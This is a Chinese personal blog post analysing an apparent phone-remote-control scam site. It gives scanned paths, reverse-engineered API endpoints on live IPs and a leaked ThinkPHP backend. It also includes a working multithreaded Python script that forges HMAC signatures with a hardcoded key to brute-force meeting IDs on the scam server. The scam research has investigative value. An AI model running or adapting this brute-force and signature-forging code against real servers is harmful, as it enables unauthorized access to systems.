
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <title> | songhahaha的个人博客</title>
    <meta name="author" content="songhahaha" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>SONGHAHAHA的个人博客</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;SONGHAHAHA的个人博客</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1></h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/2
        </span>
        
        
    </div>
    
    <div class="content" v-pre>
        <p>诈骗网站链接：</p>
<pre><code>http://156.254.50.19/
</code></pre>
<span id="more"></span>

<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402204415104.png" alt="image-20250402204415104"></p>
<p>经过目录扫描发现网址：</p>
<pre><code>http://156.254.50.19/ad.html
</code></pre>
<p>这是更新跳转链接的，没什么用？</p>
<p>然后诈骗流程</p>
<p>大概就是下载一个<strong>n会议</strong>客户端。然后远程操控你手机来骗钱吧。</p>
<p>经过对客户端逆向分析，得到以下api：</p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402211108923.png" alt="image-20250402211108923"></p>
<p>注意：用前面的网址访问thinkphp需要x-signature，但是可以用<a target="_blank" rel="noopener" href="http://172.83.157.18:39001/api/room/create%EF%BC%8C%E5%8D%B3%E4%B8%8D%E9%9C%80%E8%A6%81%E7%AD%BE%E5%90%8D%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E8%80%8C%E4%B8%8D%E4%BC%9A%E6%8A%A5%E9%94%99403%E3%80%82">http://172.83.157.18:39001/api/room/create，即不需要签名也可以访问而不会报错403。</a></p>
<pre><code>http://172.83.157.18:39001/api/room/create 
http://172.83.157.18:39001/api/room/random_name 
http://172.83.157.18:39001/api/room/delete 
http://172.83.157.18:39001/api/config/errorLog
</code></pre>
<p>尝试对会议号爆破脚本如下：</p>
<pre><code class="python">import hmac
import hashlib
import base64
import json
import time

import requests


def generate_hmac_sha256(data: str, key: str) -&gt; str:
    if not data or not key:
        raise ValueError(&quot;Input data and key cannot be empty&quot;)

    # 使用 UTF-8 编码转换为字节
    key_bytes = key.encode(&#39;utf-8&#39;)
    data_bytes = data.encode(&#39;utf-8&#39;)

    # 计算 HMAC-SHA256
    hmac_obj = hmac.new(key_bytes, data_bytes, hashlib.sha256)
    hmac_digest = hmac_obj.digest()

    # Base64 编码
    return base64.b64encode(hmac_digest).decode(&#39;utf-8&#39;)


# 示例

def req(name):
    url = &quot;https://dogs.uhys.site/api/room/join&quot;
    payload = json.dumps(&#123;
        &quot;name&quot;: name,
        &quot;versionName&quot;: &quot;1.3.20&quot;,
        &quot;app&quot;: &quot;Android&quot;,
        &quot;phoneInfo&quot;: &quot;品牌: Xiaomi;型号: Redmi Note 7;版本: 12&quot;
    &#125;)
    timestamp = int(time.time())
    hash_time = hashlib.md5((str(timestamp)+&quot;_KTFrzc&quot;).encode()).hexdigest()
    ua = f&quot;&#123;timestamp&#125;_&#123;hash_time&#125;&quot;
    secret_key = &quot;sdasdeasdafiinxhkjasodjlkasdkiwjlakc&quot;  # 这里的密钥应从安全存储获取
    message = str(name)
    hmac_signature = generate_hmac_sha256(message, secret_key)
    #print(&quot;HMAC-SHA256 Signature:&quot;, hmac_signature)
    #print(ua)
    headers = &#123;
        &#39;x-signature&#39;: hmac_signature,
        &#39;user-agent&#39;: ua,
        &#39;Content-Type&#39;: &#39;application/json&#39;
    &#125;

    response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload)
    if &quot;不存在&quot; not in response.text:
        print(response.text)
    else:
        print(f&quot;&#123;name&#125;不存在&quot;)

import threading

def thread_function(start, end):
    for i in range(start, end):
        req(i)

if __name__ == &quot;__main__&quot;:
    threads = []
    start1 = 1000
    num_threads = 100
    range_per_thread = (9999 - start1) // num_threads

    for n in range(num_threads):
        start = start1 + n * range_per_thread
        end = start + range_per_thread if n &lt; num_threads - 1 else 9999
        thread = threading.Thread(target=thread_function, args=(start, end))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
</code></pre>
<p>注意user-agent和x-signature的生成逻辑。</p>
<p>其中create这个api经过逆向分析传入了一个uuid参数，具体内容为android_id。应该是通过判断这个检测有没有权限开启会议。</p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402205031237.png" alt="image-20250402205031237"></p>
<p>继续对api进行分析，发现用的是ThinkPhp，版本号v6.1.4</p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402205305618.png" alt="image-20250402205305618"></p>
<p>同时泄露：<a target="_blank" rel="noopener" href="http://172.83.157.18/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%96%91%E4%BC%BC%E6%98%AF%E8%A7%86%E9%A2%91%E9%80%9A%E8%AF%9D%E7%9A%84%E5%B9%B3%E5%8F%B0%EF%BC%88Jitsi">http://172.83.157.18/，这个疑似是视频通话的平台（Jitsi</a> Meet），绑定域名<a target="_blank" rel="noopener" href="https://meet.uhycloud.sbs./">https://meet.uhycloud.sbs。</a></p>
<p>同时发现端口<a target="_blank" rel="noopener" href="http://172.83.157.18:5280/">172.83.157.18:5280</a>，是Prosody。扫描目录发现路径<a target="_blank" rel="noopener" href="http://172.83.157.18:5280/sessions">172.83.157.18:5280&#x2F;sessions</a></p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402205645189.png" alt="image-20250402205645189"></p>
<p>应该是活跃的session数量？</p>
<p>ThinkPhp泄露了部分源码。</p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402205913233.png" alt="image-20250402205913233"></p>
<p><img src="/images/%E6%9F%90%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E5%88%86%E6%9E%90/image-20250402210042258.png" alt="image-20250402210042258"></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2025 songhahaha的个人博客
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;songhahaha
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
